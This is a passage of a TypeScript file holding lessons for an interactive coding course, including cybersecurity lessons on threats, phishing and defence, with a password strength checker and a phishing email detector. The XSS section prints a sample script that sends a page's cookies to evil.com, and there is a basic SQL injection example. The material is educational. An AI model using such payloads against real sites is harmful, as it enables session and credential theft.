<li><strong>Tailgating</strong> - Following authorized personnel into secure areas</li>
<li><strong>Quid Pro Quo</strong> - Offering something in exchange for information</li>
</ul>

<h3>🌐 Network Attacks</h3>
<ul>
<li><strong>DDoS</strong> - Overwhelming systems with traffic</li>
<li><strong>Man-in-the-Middle (MitM)</strong> - Intercepting communications</li>
<li><strong>SQL Injection</strong> - Exploiting database vulnerabilities</li>
<li><strong>Cross-Site Scripting (XSS)</strong> - Injecting malicious scripts into websites</li>
</ul>
</section>

<section id="defense-layers">
<h2>Defense in Depth</h2>
<p>No single security measure is enough. <strong>Defense in Depth</strong> uses multiple layers:</p>

<pre><code>┌─────────────────────────────────────┐
│         Physical Security           │  ← Guards, locks, cameras
├─────────────────────────────────────┤
│        Network Security             │  ← Firewalls, IDS/IPS
├─────────────────────────────────────┤
│        Endpoint Security            │  ← Antivirus, EDR
├─────────────────────────────────────┤
│      Application Security           │  ← WAF, secure coding
├─────────────────────────────────────┤
│         Data Security               │  ← Encryption, DLP
├─────────────────────────────────────┤
│     User Awareness Training         │  ← Security culture
└─────────────────────────────────────┘</code></pre>
</section>

<section id="careers">
<h2>Career Paths in Cybersecurity</h2>
<p>Cybersecurity offers diverse and rewarding career opportunities:</p>

<table class="info-table">
<tr><th>Role</th><th>Focus</th><th>Avg. Salary (US)</th></tr>
<tr><td>Security Analyst</td><td>Monitor, detect, respond to threats</td><td>$75,000 - $120,000</td></tr>
<tr><td>Penetration Tester</td><td>Ethically hack to find vulnerabilities</td><td>$85,000 - $140,000</td></tr>
<tr><td>Security Engineer</td><td>Design and implement security systems</td><td>$100,000 - $160,000</td></tr>
<tr><td>Incident Responder</td><td>Handle security breaches</td><td>$80,000 - $130,000</td></tr>
<tr><td>Security Architect</td><td>Design enterprise security</td><td>$130,000 - $200,000</td></tr>
<tr><td>CISO</td><td>Executive security leadership</td><td>$180,000 - $400,000+</td></tr>
</table>

<div class="success-box">
<h4>🚀 Your Cybersecurity Journey Starts Here!</h4>
<p>You're taking the first step into an exciting, high-demand field. Continue with this course to build your foundation!</p>
</div>
</section>
    `,
    code: {
      html: `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Password Strength Analyzer</title>
</head>
<body>
    <div class="container">
        <h1>🔐 Password Security Analyzer</h1>
        <p>Test how secure your password is:</p>
        
        <div class="input-group">
            <input type="password" id="password" placeholder="Enter a password to test" oninput="analyzePassword()">
            <button onclick="toggleVisibility()" id="toggleBtn">👁️</button>
        </div>
        
        <div id="result" class="result">
            <div class="strength-meter">
                <div id="strength-bar" class="strength-bar"></div>
            </div>
            <p id="strength-text">Enter a password to analyze</p>
        </div>
        
        <div id="details" class="details">
            <h3>Password Analysis:</h3>
            <ul id="checks"></ul>
        </div>
        
        <div class="tips">
            <h3>🛡️ Strong Password Tips:</h3>
            <ul>
                <li>Use at least 12-16 characters</li>
                <li>Mix uppercase and lowercase letters</li>
                <li>Include numbers and special characters (!@#$%^&*)</li>
                <li>Avoid personal information (names, birthdays)</li>
                <li>Don't reuse passwords across sites</li>
                <li>Consider using a password manager</li>
            </ul>
        </div>
    </div>
</body>
</html>`,
      css: `* {
  box-sizing: border-box;
}

body {
  font-family: 'Segoe UI', system-ui, sans-serif;
  background: linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 50%, #16213e 100%);
  color: #e0e0e0;
  margin: 0;
  padding: 20px;
  min-height: 100vh;
}

.container {
  max-width: 500px;
  margin: 0 auto;
  padding: 30px;
  background: rgba(26, 26, 46, 0.9);
  border-radius: 16px;
  border: 1px solid rgba(0, 255, 136, 0.3);
  box-shadow: 0 0 40px rgba(0, 255, 136, 0.1);
}

h1 {
  color: #00ff88;
  text-align: center;
  margin-bottom: 10px;
}

.input-group {
  display: flex;
  gap: 10px;
  margin: 20px 0;
}

input {
  flex: 1;
  padding: 15px;
  background: #0a0a1a;
  border: 2px solid #333;
  border-radius: 8px;
  color: white;
  font-size: 16px;
}

input:focus {
  outline: none;
  border-color: #00ff88;
}

#toggleBtn {
  padding: 15px;
  background: #333;
  border: none;
  border-radius: 8px;
  cursor: pointer;
  font-size: 18px;
}

.result {
  background: rgba(0, 0, 0, 0.3);
  padding: 20px;
  border-radius: 12px;
  margin: 20px 0;
}

.strength-meter {
  height: 12px;
  background: #1a1a2e;
  border-radius: 6px;
  overflow: hidden;
}

.strength-bar {
  height: 100%;
  width: 0%;
  border-radius: 6px;
  transition: all 0.3s ease;
}

#strength-text {
  margin-top: 10px;
  font-weight: bold;
  text-align: center;
}

.details {
  background: rgba(0, 0, 0, 0.2);
  padding: 15px;
  border-radius: 8px;
  margin: 20px 0;
}

.details h3 {
  color: #00d4ff;
  margin-top: 0;
}

.details ul {
  margin: 0;
  padding-left: 20px;
}

.details li {
  margin: 8px 0;
  display: flex;
  align-items: center;
  gap: 8px;
}

.check-pass { color: #00ff88; }
.check-fail { color: #ff4444; }

.tips {
  background: rgba(0, 255, 136, 0.1);
  padding: 20px;
  border-radius: 12px;
  border-left: 4px solid #00ff88;
}

.tips h3 {
  color: #00ff88;
  margin-top: 0;
}

.tips li {
  margin: 10px 0;
}`,
      js: `let isVisible = false;

function toggleVisibility() {
  const input = document.getElementById('password');
  const btn = document.getElementById('toggleBtn');
  isVisible = !isVisible;
  input.type = isVisible ? 'text' : 'password';
  btn.textContent = isVisible ? '🙈' : '👁️';
}

function analyzePassword() {
  const password = document.getElementById('password').value;
  const strengthBar = document.getElementById('strength-bar');
  const strengthText = document.getElementById('strength-text');
  const checksEl = document.getElementById('checks');
  
  // Define checks
  const checks = [
    { name: "At least 8 characters", test: password.length >= 8 },
    { name: "At least 12 characters (recommended)", test: password.length >= 12 },
    { name: "Contains lowercase letters", test: /[a-z]/.test(password) },
    { name: "Contains uppercase letters", test: /[A-Z]/.test(password) },
    { name: "Contains numbers", test: /[0-9]/.test(password) },
    { name: "Contains special characters", test: /[!@#$%^&*(),.?":{}|<>]/.test(password) },
    { name: "No common patterns", test: !/^(password|123456|qwerty|abc123)/i.test(password) },
    { name: "No repeated characters (aaa)", test: !/(.)\\1{2,}/.test(password) }
  ];
  
  // Calculate score
  let score = 0;
  let html = '';
  
  checks.forEach(check => {
    if (check.test) score++;
    const icon = check.test ? '✅' : '❌';
    const cls = check.test ? 'check-pass' : 'check-fail';
    html += '<li class="' + cls + '">' + icon + ' ' + check.name + '</li>';
  });
  
  checksEl.innerHTML = html;
  
  // Calculate percentage and color
  const percentage = (score / checks.length) * 100;
  let color, text, textColor;
  
  if (password.length === 0) {
    color = '#333';
    text = 'Enter a password to analyze';
    textColor = '#888';
  } else if (percentage <= 25) {
    color = '#ff4444';
    text = '🔴 Very Weak - Easily cracked in seconds!';
    textColor = '#ff4444';
  } else if (percentage <= 50) {
    color = '#ff8800';
    text = '🟠 Weak - Could be cracked in minutes';
    textColor = '#ff8800';
  } else if (percentage <= 75) {
    color = '#ffcc00';
    text = '🟡 Moderate - Could take hours to crack';
    textColor = '#ffcc00';
  } else if (percentage <= 87.5) {
    color = '#88ff00';
    text = '🟢 Strong - Would take years to crack';
    textColor = '#88ff00';
  } else {
    color = '#00ff88';
    text = '💪 Excellent - Nearly impossible to crack!';
    textColor = '#00ff88';
  }
  
  strengthBar.style.width = percentage + '%';
  strengthBar.style.background = color;
  strengthText.textContent = text;
  strengthText.style.color = textColor;
  
  // Log analysis
  if (password.length > 0) {
    console.log('Password Analysis:', {
      length: password.length,
      score: score + '/' + checks.length,
      strength: text
    });
  }
}

console.log('🔐 Password Security Analyzer loaded!');
console.log('📝 Try entering different passwords to see the analysis.');`
    }
  },

  "cyber-2": {
    id: "cyber-2",
    title: "Common Threats & Attacks",
    tableOfContents: [
      { id: "malware-types", title: "Types of Malware" },
      { id: "phishing", title: "Phishing Attacks" },
      { id: "social-engineering", title: "Social Engineering" },
      { id: "network-attacks", title: "Network Attacks" },
      { id: "prevention", title: "Prevention Strategies" },
    ],
    content: `
<section id="malware-types">
<h2>Types of Malware</h2>
<p>Malware (malicious software) is any software intentionally designed to cause damage. Understanding different types helps you recognize and defend against them.</p>

<h3>🦠 Virus</h3>
<p>A program that attaches itself to legitimate software and spreads when the infected program runs.</p>
<ul>
<li><strong>Behavior:</strong> Requires human action to spread (opening file, running program)</li>
<li><strong>Example:</strong> ILOVEYOU virus (2000) - spread via email attachment, caused $10B in damages</li>
<li><strong>Prevention:</strong> Don't open suspicious attachments, use antivirus software</li>
</ul>

<h3>🐛 Worm</h3>
<p>Self-replicating malware that spreads across networks without human interaction.</p>
<ul>
<li><strong>Behavior:</strong> Exploits network vulnerabilities to spread automatically</li>
<li><strong>Example:</strong> WannaCry (2017) - exploited Windows SMB vulnerability</li>
<li><strong>Prevention:</strong> Keep systems patched, segment networks</li>
</ul>

<h3>🎭 Trojan</h3>
<p>Malware disguised as legitimate software that tricks users into installation.</p>
<ul>
<li><strong>Behavior:</strong> Appears useful but contains hidden malicious code</li>
<li><strong>Example:</strong> Fake antivirus software, pirated games with backdoors</li>
<li><strong>Prevention:</strong> Only download from trusted sources</li>
</ul>

<h3>🔒 Ransomware</h3>
<p>Encrypts victim's files and demands payment for the decryption key.</p>
<ul>
<li><strong>Behavior:</strong> Locks files, displays ransom note demanding cryptocurrency</li>
<li><strong>Example:</strong> Colonial Pipeline attack - $4.4M ransom paid</li>
<li><strong>Prevention:</strong> Regular backups, email filtering, user training</li>
</ul>

<h3>👁️ Spyware</h3>
<p>Secretly monitors user activity and collects sensitive information.</p>
<ul>
<li><strong>Behavior:</strong> Captures keystrokes, screenshots, browsing history</li>
<li><strong>Example:</strong> Pegasus spyware - used to spy on journalists and activists</li>
<li><strong>Prevention:</strong> Use anti-spyware tools, review app permissions</li>
</ul>

<h3>🤖 Botnet</h3>
<p>Network of infected computers controlled by an attacker.</p>
<ul>
<li><strong>Behavior:</strong> Used for DDoS attacks, spam, cryptocurrency mining</li>
<li><strong>Example:</strong> Mirai botnet - took down major websites in 2016</li>
<li><strong>Prevention:</strong> Secure IoT devices, change default passwords</li>
</ul>
</section>

<section id="phishing">
<h2>Phishing Attacks</h2>
<p>Phishing uses fraudulent communications to steal sensitive information. It's the #1 attack vector for data breaches.</p>

<div class="example-box">
<h4>📧 Phishing Email Example:</h4>
<pre><code>From: security@amaz0n-verify.com  ← Fake domain!
Subject: Your account has been compromised! Urgent!

Dear Customer,

We detected suspicious activity on your account. 
Click here to verify your identity within 24 hours 
or your account will be suspended.

[Verify Now] ← Links to fake login page

Amazon Security Team</code></pre>
</div>

<h3>🚨 Red Flags to Watch For:</h3>
<ul>
<li><strong>Urgency:</strong> "Act now!", "Your account will be closed!"</li>
<li><strong>Suspicious sender:</strong> Misspelled domains, generic addresses</li>
<li><strong>Grammar errors:</strong> Poor spelling, awkward phrasing</li>
<li><strong>Suspicious links:</strong> Hover to see real URL before clicking</li>
<li><strong>Requests for sensitive info:</strong> Passwords, SSN, credit cards</li>
<li><strong>Unexpected attachments:</strong> Especially .exe, .zip, .doc with macros</li>
</ul>

<h3>Types of Phishing:</h3>
<table class="info-table">
<tr><th>Type</th><th>Target</th><th>Method</th></tr>
<tr><td>Email Phishing</td><td>Anyone</td><td>Mass emails impersonating brands</td></tr>
<tr><td>Spear Phishing</td><td>Specific individuals</td><td>Personalized, researched attacks</td></tr>
<tr><td>Whaling</td><td>Executives (C-suite)</td><td>High-value targets with authority</td></tr>
<tr><td>Smishing</td><td>Mobile users</td><td>SMS text messages</td></tr>
<tr><td>Vishing</td><td>Phone users</td><td>Voice calls, VoIP</td></tr>
<tr><td>Clone Phishing</td><td>Previous recipients</td><td>Copied legitimate emails</td></tr>
</table>
</section>

<section id="social-engineering">
<h2>Social Engineering</h2>
<p>Social engineering exploits human psychology rather than technical vulnerabilities. It's often easier to manipulate people than systems.</p>

<h3>Common Techniques:</h3>

<div class="highlight-box">
<h4>🎭 Pretexting</h4>
<p>Creating a fabricated scenario to engage a victim. Example: Calling as "IT support" to get credentials.</p>
</div>

<div class="highlight-box">
<h4>🎣 Baiting</h4>
<p>Offering something enticing to get access. Example: Leaving infected USB drives in parking lots.</p>
</div>

<div class="highlight-box">
<h4>🚪 Tailgating</h4>
<p>Following authorized personnel into secure areas. Example: "Can you hold the door? My badge isn't working."</p>
</div>

<div class="highlight-box">
<h4>🤝 Quid Pro Quo</h4>
<p>Offering a service in exchange for information. Example: "Free tech support" that requires remote access.</p>
</div>

<div class="highlight-box">
<h4>😨 Scareware</h4>
<p>Frightening users into action. Example: Fake virus warnings demanding you download "antivirus."</p>
</div>
</section>

<section id="network-attacks">
<h2>Network Attacks</h2>

<h3>🌊 DDoS (Distributed Denial of Service)</h3>
<p>Overwhelming a target with traffic from multiple sources, making it unavailable.</p>
<pre><code>Normal traffic: 1,000 requests/second
DDoS attack: 100,000,000+ requests/second</code></pre>

<h3>👤 Man-in-the-Middle (MitM)</h3>
<p>Attacker secretly intercepts communication between two parties.</p>
<pre><code>Victim → [Attacker] → Server
         ↑
   Sees all data</code></pre>

<h3>💉 SQL Injection</h3>
<p>Injecting malicious SQL code into database queries.</p>
<pre><code>Normal: SELECT * FROM users WHERE username='john'
Attack: SELECT * FROM users WHERE username='' OR '1'='1'
                                    ↑ Always true!</code></pre>

<h3>📜 Cross-Site Scripting (XSS)</h3>
<p>Injecting malicious scripts into trusted websites.</p>
<pre><code>&lt;script&gt;document.location='http://evil.com/steal?cookie='+document.cookie&lt;/script&gt;</code></pre>
</section>

<section id="prevention">
<h2>Prevention Strategies</h2>

<div class="success-box">
<h4>✅ Personal Security Checklist:</h4>
<ul>
<li>🔐 Use strong, unique passwords (password manager recommended)</li>
<li>📱 Enable Multi-Factor Authentication (MFA) everywhere</li>
<li>🔄 Keep all software updated</li>
<li>🔍 Verify sender before clicking links or downloading</li>
<li>🌐 Use HTTPS websites only for sensitive data</li>
<li>📡 Avoid public WiFi for banking/sensitive activities</li>
<li>💾 Backup important data regularly (3-2-1 rule)</li>
<li>🧠 Stay informed about current threats</li>
</ul>
</div>
</section>
    `,
    code: {
      html: `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Phishing Email Analyzer</title>
</head>
<body>
    <div class="container">
        <h1>🎣 Phishing Email Detector</h1>
        <p>Paste a suspicious email to analyze for phishing indicators:</p>
        
        <textarea id="emailContent" placeholder="Paste email content here...

Example:
From: security@paypa1.com
Subject: URGENT: Your account has been compromised!

Dear Customer,

We have detected unusual activity..."></textarea>
        
        <button onclick="analyzeEmail()">🔍 Analyze Email</button>
        
        <div id="results" class="results hidden">
            <h2>Analysis Results:</h2>
            <div id="riskLevel" class="risk-level"></div>
            <div id="findings" class="findings"></div>
        </div>
    </div>
</body>
</html>`,
      css: `* {
  box-sizing: border-box;
}

body {
  font-family: 'Segoe UI', system-ui, sans-serif;
  background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
  color: #e0e0e0;
  margin: 0;
  padding: 20px;
  min-height: 100vh;
}

.container {
  max-width: 700px;
  margin: 0 auto;
  padding: 30px;
  background: rgba(26, 26, 46, 0.95);
  border-radius: 16px;
  border: 1px solid rgba(255, 100, 100, 0.3);
  box-shadow: 0 0 40px rgba(255, 100, 100, 0.1);
}

h1 {
  color: #ff6b6b;
  text-align: center;
}

textarea {
  width: 100%;
  height: 200px;
  padding: 15px;
  background: #0a0a1a;
  border: 2px solid #333;
  border-radius: 8px;
  color: white;
  font-family: 'Monaco', monospace;
  font-size: 13px;
  resize: vertical;
  margin: 15px 0;
}

textarea:focus {
  outline: none;
  border-color: #ff6b6b;
}

button {
  width: 100%;
  padding: 15px;
  background: linear-gradient(135deg, #ff6b6b, #ff8e53);
  border: none;
  border-radius: 8px;
  color: white;
  font-size: 16px;
  font-weight: bold;
  cursor: pointer;
  transition: transform 0.2s, box-shadow 0.2s;
}

button:hover {
  transform: translateY(-2px);
  box-shadow: 0 4px 15px rgba(255, 107, 107, 0.4);
}

.results {
  margin-top: 20px;
  padding: 20px;
  background: rgba(0, 0, 0, 0.3);
  border-radius: 12px;
}

.hidden {
  display: none;
}

.risk-level {
  padding: 15px;
  border-radius: 8px;
  text-align: center;
  font-size: 18px;
  font-weight: bold;
  margin-bottom: 15px;
}

.risk-high {
  background: rgba(255, 68, 68, 0.2);
  border: 1px solid #ff4444;
  color: #ff4444;
}

.risk-medium {
  background: rgba(255, 170, 0, 0.2);
  border: 1px solid #ffaa00;
  color: #ffaa00;
}

.risk-low {
  background: rgba(0, 255, 136, 0.2);
  border: 1px solid #00ff88;
  color: #00ff88;
}

.findings {
  margin-top: 15px;
}

.finding {
  display: flex;
  align-items: flex-start;
  gap: 10px;
  padding: 10px;
  margin: 8px 0;
  background: rgba(0, 0, 0, 0.2);
  border-radius: 6px;
  border-left: 3px solid;
}

.finding-high { border-color: #ff4444; }
.finding-medium { border-color: #ffaa00; }
.finding-low { border-color: #00ff88; }

.finding-icon {
  font-size: 20px;
}

.finding-text strong {
  display: block;
  margin-bottom: 4px;
}`,
      js: `function analyzeEmail() {
  const content = document.getElementById('emailContent').value;
  const resultsDiv = document.getElementById('results');
  const riskLevelDiv = document.getElementById('riskLevel');
  const findingsDiv = document.getElementById('findings');
  
  if (!content.trim()) {
    alert('Please paste an email to analyze');
    return;
  }
  
  const findings = [];
  
  // Check for suspicious domain patterns
  const domainPatterns = [
    { pattern: /@[a-z]+[0-9]+\\./i, msg: "Suspicious domain with numbers (e.g., paypa1.com)", severity: "high" },
    { pattern: /(verify|security|alert|update|confirm)[^@]*@/i, msg: "Suspicious keyword in sender address", severity: "medium" },
    { pattern: /\\.ru|\\.cn|\\.tk|\\.xyz/i, msg: "High-risk top-level domain detected", severity: "high" },
  ];
  
  // Check for urgency language
  const urgencyPatterns = [
    { pattern: /urgent|immediately|right now|within 24 hours|asap/i, msg: "Urgency language detected", severity: "medium" },
    { pattern: /suspended|compromised|blocked|locked|verify/i, msg: "Threatening/alarming language", severity: "medium" },
    { pattern: /click here|click below|click now/i, msg: "Generic call-to-action link", severity: "low" },
  ];
  
  // Check for sensitive info requests
  const sensitivePatterns = [
    { pattern: /password|ssn|social security|credit card|bank account/i, msg: "Requests sensitive information", severity: "high" },
    { pattern: /confirm your (identity|account|details)/i, msg: "Asks to confirm personal details", severity: "high" },
  ];
  
  // Check for grammar issues
  const grammarPatterns = [
    { pattern: /dear (customer|user|member)\\b/i, msg: "Generic greeting (not personalized)", severity: "medium" },
    { pattern: /\\s{2,}/g, msg: "Multiple spaces (possible copy-paste from translation)", severity: "low" },
  ];
  
  // All patterns to check
  const allPatterns = [...domainPatterns, ...urgencyPatterns, ...sensitivePatterns, ...grammarPatterns];
  
  allPatterns.forEach(p => {
    if (p.pattern.test(content)) {
      findings.push({ message: p.msg, severity: p.severity });
    }
  });
  
  // Calculate risk score
  const highCount = findings.filter(f => f.severity === 'high').length;
  const mediumCount = findings.filter(f => f.severity === 'medium').length;
  const riskScore = highCount * 3 + mediumCount * 1.5;
  
  // Determine overall risk level
  let riskLevel, riskClass;
  if (riskScore >= 6) {
    riskLevel = '🚨 HIGH RISK - Likely Phishing!';
    riskClass = 'risk-high';
  } else if (riskScore >= 3) {
    riskLevel = '⚠️ MEDIUM RISK - Be Cautious';
    riskClass = 'risk-medium';
  } else {
    riskLevel = '✅ LOW RISK - Appears Safe';
    riskClass = 'risk-low';
  }
  
  // Display results
  resultsDiv.classList.remove('hidden');
  riskLevelDiv.textContent = riskLevel;
  riskLevelDiv.className = 'risk-level ' + riskClass;
  
  if (findings.length === 0) {
    findingsDiv.innerHTML = '<p>No suspicious patterns detected. Still exercise caution with unfamiliar senders!</p>';
  } else {
    const icons = { high: '🔴', medium: '🟠', low: '🟢' };
    findingsDiv.innerHTML = findings.map(f => 
      '<div class="finding finding-' + f.severity + '">' +
        '<span class="finding-icon">' + icons[f.severity] + '</span>' +
        '<span class="finding-text"><strong>' + f.severity.toUpperCase() + '</strong>' + f.message + '</span>' +
      '</div>'
    ).join('');
  }
  
  console.log('📧 Email Analysis Complete:', { riskScore, findings: findings.length });
}

console.log('🎣 Phishing Email Detector loaded!');
console.log('💡 Paste a suspicious email to analyze it for phishing indicators.');`
    }
  }
};

// Helper to get content for any lesson, with fallback
export function getLessonContentById(lessonId: string): LessonContent {
  if (lessonContents[lessonId]) {
    return lessonContents[lessonId];
  }
  
  // Generate comprehensive fallback content based on lesson ID
  const parts = lessonId.split('-');
  const category = parts[0];
  const number = parts[1] || '1';
  
  const categoryInfo: Record<string, { title: string; topics: string[]; icon: string }> = {
    'html': { title: 'HTML', topics: ['Structure', 'Elements', 'Attributes', 'Semantic HTML'], icon: '📄' },
    'css': { title: 'CSS', topics: ['Selectors', 'Box Model', 'Flexbox', 'Grid', 'Animations'], icon: '🎨' },
    'js': { title: 'JavaScript', topics: ['Variables', 'Functions', 'DOM', 'Events', 'APIs'], icon: '⚡' },
    'react': { title: 'React', topics: ['Components', 'Hooks', 'State', 'Props', 'Effects'], icon: '⚛️' },
    'cyber': { title: 'Cybersecurity', topics: ['Threats', 'Defense', 'Encryption', 'Authentication'], icon: '🔐' },
    'hack': { title: 'Ethical Hacking', topics: ['Reconnaissance', 'Scanning', 'Exploitation', 'Reporting'], icon: '🎯' },
    'net': { title: 'Network Security', topics: ['Protocols', 'Firewalls', 'VPNs', 'Monitoring'], icon: '🌐' },
    'ai': { title: 'AI & Machine Learning', topics: ['Neural Networks', 'Training', 'Models', 'Applications'], icon: '🧠' },
    'ml': { title: 'Machine Learning', topics: ['Algorithms', 'Datasets', 'Features', 'Evaluation'], icon: '📊' },
    'python': { title: 'Python', topics: ['Syntax', 'Data Structures', 'Functions', 'Libraries'], icon: '🐍' },
    'node': { title: 'Node.js', topics: ['Modules', 'Express', 'APIs', 'Databases'], icon: '🟢' },
    'docker': { title: 'Docker', topics: ['Containers', 'Images', 'Compose', 'Networking'], icon: '🐳' },
    'git': { title: 'Git', topics: ['Commits', 'Branches', 'Merging', 'Collaboration'], icon: '📓' },
    'sql': { title: 'SQL', topics: ['Queries', 'Joins', 'Indexes', 'Transactions'], icon: '🗄️' },
    'api': { title: 'APIs', topics: ['REST', 'GraphQL', 'Authentication', 'Rate Limiting'], icon: '🔗' },
  };
  
  const info = categoryInfo[category] || { 
    title: category.toUpperCase(), 
    topics: ['Fundamentals', 'Best Practices', 'Real-World Applications'],
    icon: '📚'
  };
  
  return {
    id: lessonId,
    title: `${info.title} - Lesson ${number}`,
    tableOfContents: [
      { id: "overview", title: "Overview" },
      { id: "concepts", title: "Key Concepts" },
      { id: "examples", title: "Examples" },
      { id: "best-practices", title: "Best Practices" },
      { id: "practice", title: "Practice Exercise" },
    ],
    content: `
<section id="overview">
<h2>${info.icon} Overview</h2>
<p>Welcome to this comprehensive lesson on <strong>${info.title}</strong>! This lesson covers essential concepts and practical skills that every developer should master.</p>

<div class="info-box">
<h4>📌 What You'll Learn:</h4>
<ul>
${info.topics.map(t => `<li>${t}</li>`).join('\n')}
</ul>
</div>

<p>By the end of this lesson, you'll have hands-on experience and be ready to apply these concepts in real projects.</p>
</section>

<section id="concepts">
<h2>🎯 Key Concepts</h2>
<p>Understanding the fundamentals is crucial for building a strong foundation. Let's explore the core concepts:</p>

<h3>Core Principles</h3>
<ul>
<li><strong>Clarity</strong> - Write code that is easy to read and understand</li>
<li><strong>Consistency</strong> - Follow established patterns and conventions</li>
<li><strong>Efficiency</strong> - Optimize for performance where it matters</li>
<li><strong>Maintainability</strong> - Design for future changes and updates</li>
</ul>

<div class="tip-box">
<h4>💡 Pro Tip:</h4>
<p>The best way to learn is by doing. Don't just read - actively practice with the code editor below!</p>
</div>
</section>

<section id="examples">
<h2>📝 Examples</h2>
<p>Let's look at some practical examples that demonstrate these concepts in action.</p>

<pre><code>// Example code will be shown here
// based on the specific lesson topic

function example() {
  console.log("Learning ${info.title}!");
  return "Success";
}</code></pre>

<p>Try modifying the examples in the code editor to experiment with different approaches.</p>
</section>

<section id="best-practices">
<h2>✅ Best Practices</h2>
<div class="success-box">
<h4>Industry Best Practices:</h4>
<ul>
<li>Always test your code thoroughly</li>
<li>Document your work for future reference</li>
<li>Follow the DRY principle (Don't Repeat Yourself)</li>
<li>Use version control (Git) for all projects</li>
<li>Stay updated with the latest developments</li>
</ul>
</div>
</section>

<section id="practice">
<h2>🏋️ Practice Exercise</h2>
<p>Now it's your turn! Use the interactive code editor to practice what you've learned.</p>

<div class="warning-box">
<h4>⚡ Challenge:</h4>
<p>Modify the starter code to implement the concepts from this lesson. Experiment, make mistakes, and learn from them!</p>
</div>
</section>
    `,
    code: {
      html: `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>${info.title} Practice</title>
</head>
<body>
    <h1>${info.icon} ${info.title} Practice</h1>
    <p>Welcome! Use this sandbox to practice what you've learned.</p>
    
    <div id="output" class="output-box">
        Click the button to run your code!
    </div>
    
    <button onclick="runCode()">▶️ Run Code</button>
    <button onclick="resetCode()">🔄 Reset</button>
</body>
</html>`,
      css: `* {
  box-sizing: border-box;
}

body {
  font-family: 'Segoe UI', system-ui, sans-serif;
  padding: 25px;
  background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
  color: white;
  min-height: 100vh;
  margin: 0;
}

h1 {
  color: #00d4ff;
  margin-bottom: 10px;
}

p {
  color: rgba(255,255,255,0.8);
}

.output-box {
  background: rgba(0, 212, 255, 0.1);
  padding: 25px;
  border-radius: 12px;
  border: 1px solid #00d4ff;
  margin: 25px 0;
  min-height: 120px;
  font-family: 'Monaco', 'Consolas', monospace;
  white-space: pre-wrap;
}

button {
  background: linear-gradient(135deg, #00d4ff, #00a8cc);
  color: #1a1a2e;
  border: none;
  padding: 12px 28px;
  margin: 5px;
  border-radius: 8px;
  cursor: pointer;
  font-weight: bold;
  font-size: 14px;
  transition: all 0.2s;
}

button:hover {
  transform: translateY(-2px);
  box-shadow: 0 4px 15px rgba(0, 212, 255, 0.4);
}

button:last-child {
  background: #333;
  color: white;
}`,
      js: `// Welcome to the ${info.title} practice area!
// Modify this code and click Run to see results

const topic = "${info.title}";
let practiceCount = 0;

function runCode() {
  practiceCount++;
  
  const output = document.getElementById('output');
  output.textContent = "🎉 Code executed successfully!\\n\\n";
  output.textContent += "Topic: " + topic + "\\n";
  output.textContent += "Practice run: #" + practiceCount + "\\n\\n";
  output.textContent += "// Your output will appear here\\n";
  output.textContent += "// Try modifying the code!";
  
  console.log("✅ Code executed - Run #" + practiceCount);
  console.log("Topic:", topic);
}

function resetCode() {
  practiceCount = 0;
  document.getElementById('output').textContent = "Code reset! Click Run to execute.";
  console.log("🔄 Code reset");
}

// Initial log
console.log("📚 Welcome to " + topic + " Practice!");
console.log("💡 Click 'Run Code' to see output in the preview.");`
    }
  };
}
